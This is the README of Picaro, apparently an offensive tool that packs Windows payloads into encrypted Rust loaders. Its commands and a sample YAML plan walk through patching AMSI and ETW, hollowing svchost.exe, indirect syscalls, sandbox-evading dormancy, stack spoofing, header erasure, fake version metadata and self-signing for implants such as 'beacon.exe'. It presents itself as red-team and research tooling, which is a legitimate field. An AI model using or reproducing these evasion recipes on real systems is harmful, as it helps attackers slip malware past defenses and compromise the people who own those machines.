<p align="center">
  <img src="docs/assets/full-logo-512.webp" alt="Picaro: a joker card bearing the Picaro jester and a P corner index" height="300" />
</p>

**Declarative evasion for Windows payloads**

Picaro takes a PE file and a YAML plan and emits a packed PE with the selected
evasion techniques baked into a freshly generated Rust stub. No cleartext
payload ever touches disk: it is authenticated-encrypted at build time and only
ever exists decrypted in memory at run time.

## Authorized use only

For **authorized red team engagements, lab environments and security research**.
You are responsible for what you build with it.

## Quick start

With a Rust toolchain (Windows, or Linux/WSL cross-compiling to Windows):

```bash
cargo run -- pack examples/payloads/test_payload.exe
cargo run -- build examples/plans/process-hollowing.yaml
cargo run -- audit dist/test_packed.exe
cargo run -- techniques list
```

Without a toolchain, the compose dev container builds the image once and
bind-mounts the repo, so source edits never rebuild it:

```bash
docker compose build dev                       # once
docker compose run --rm dev-run build examples/plans/process-hollowing.yaml
docker compose run --rm dev cargo test
```

Both paths cross-compile the Windows PE, so run the resulting artifact on a
Windows host. `python scripts/picaro.py` is the **production** image for a
machine with nothing installed; it builds `picaro:latest` on first use. See
[`docs/`](docs/) for every variant.

## Pack without a plan

`pack` detects the format and composes the plan for you:

```bash
cargo run -- pack examples/payloads/test_payload.exe
```

It picks `reflective_loading` for a PE or raw shellcode, `dotnet_hosting` for a
.NET assembly and `powershell_hosting` for a `.ps1`, defaults to indirect
syscalls with `hells_gate`, and writes one self-contained bundle per run to
`packed/<payload>-<run>/`: the generated `plan.yaml`, the rendered sources and
encrypted blobs under `build/`, the artifact under `dist/` and the provenance
(manifest, and with `--sign lab` the CA and lab identity) under `artifacts/`.

For a DLL, `pack` reads the export table: if there is exactly one callable
export besides `DllMain`, it selects it and says so; if there are several, it
lists them and asks for `--export <name>`.

```text
packed/test_payload-12345-1764000000000000000/
├── plan.yaml
├── build/
│   ├── main.rs
│   ├── payload_0.bin
│   └── out.exe
├── dist/
│   └── test_payload.exe
└── artifacts/
    └── test_payload.manifest.json
```

Common knobs:

```bash
cargo run -- pack beacon.bin --patch-amsi --patch-etw --erase-header
cargo run -- pack implant.exe --hollow --target 'C:\Windows\System32\svchost.exe'
cargo run -- pack app.exe --syscalls indirect --resolver tartarus-gate --stack-spoofing
cargo run -- pack app.exe --sign lab --icon random
cargo run -- pack payload.ps1 --allow-experimental
```

A non-`Stable` technique selected explicitly with `--exec`/`-t` needs
`--allow-experimental`. Change the defaults in `picaro.config.yaml` (see
`examples/picaro.config.yaml`); `picaro pack --help` lists every flag and
[CLI pack design](docs/design/cli-pack.md) explains the ordering. When the build
outgrows the flags, `--print-plan` emits the YAML and you continue with
`picaro build`.

## Build a payload

`build` takes a YAML plan and writes the same kind of bundle:
`packed/<plan>-<run>/` with `build/` (sources and compiler output), `dist/` (the
artifact) and `artifacts/` (manifest, CA). `output.path` only decides where the
delivered copy goes: `./dist/beacon.exe` in a plan named `beacon` delivers to
`dist/beacon.exe` while the bundle keeps its own canonical copy; omit `path` and
the artifact stays inside the bundle (`packed/<plan>-<run>/dist/beacon.exe`).
`--build-name <name>` pins the bundle to `packed/<plan>-<name>/` for debugging.

A build is one YAML document. `build.payloads` maps a name to your binary,
`build.stub` holds loader-wide settings (the syscall layer, string obfuscation),
`build.output` places the artifact and can embed resources and sign it, and the
top-level `runtime` list is the ordered chain the stub walks — preparation
techniques first, then the execution technique that runs the payload:

```yaml
schema: 6
name: demo

build:
  # Named payloads
  payloads:
    implant:
      source: ./beacon.exe          
  # Loader
  stub:
    syscalls: 
      mode: indirect
      resolver: tartarus_gate 
    strings: 
      strategy: xor
      key: random 
  output:
    path: ./dist/beacon_packed.exe
    resources:
      icon: ./examples/assets/sample.ico
      version_info: 
        randomize: true                  # Fake Company, ProductName, Version...etc
    sign: { mode: lab }                  # Create CA and sign the binary

# One ordered chain: preparations run first, then the payload.
runtime:
  - technique: bouncer                   # stay dormant off-target / in a sandbox
    params:
      require:
        - ram_mb: 2048
      anti_analysis:
        sandbox: true

  - technique: patch_amsi                # neutralize AMSI in the loader's process
  - technique: patch_etw                 # and ETW, before anything runs

  - technique: process_hollowing         # run the PE inside a signed host process
    params:
      payload: implant
      target: "C:\\Windows\\System32\\svchost.exe"
```

```bash
cargo run -- build plan.yaml
# or, in the dev container:
# docker compose run --rm dev-run build plan.yaml
```

## Examples

Ready-to-run plans live in [`examples/plans/`](examples/plans) (process
hollowing, reflective loading, indirect syscalls, .NET, DLL output, shellcode,
preparations, signing, x86, …), with payloads in
[`examples/payloads/`](examples/payloads). Start there and point `source` at
your own binary.

## Development

The fast loop needs no image rebuild. On the host (or in the dev container):

```bash
cargo run -- build examples/plans/process-hollowing.yaml
cargo test
cargo clippy --all-targets -- -D warnings
```

In the dev container, `target/` lives in the `picaro-target` volume and
`scripts/dev-entrypoint.sh` seeds the cross-compiled stub dependencies once:

```bash
docker compose run --rm dev bash                 # shell in /work
docker compose run --rm dev-run build plan.yaml  # one-shot cargo run
docker compose run --rm dev cargo test
```

`docker compose down -v` resets the cached build. The live suite (it compiles
and runs artifacts) stays opt-in and lab-only:

```bash
cargo test --features live-tests -- --ignored
```

With the Docker wrapper (`scripts/picaro.py`) the current directory is mounted at
`/work`; each build writes its bundle to `/work/packed/<plan>-<run>/`, so the
plan, sources, artifact and manifest land on the host, and `output.path` decides
where the delivered copy goes (also inside the mount). Because the image embeds
the packer binary, rebuild it after pulling a source change:

```bash
python scripts/picaro.py --rebuild pack payload.exe
```

## Documentation

Full docs live in [`docs/`](docs/) (`python scripts/docs.py` previews the site).
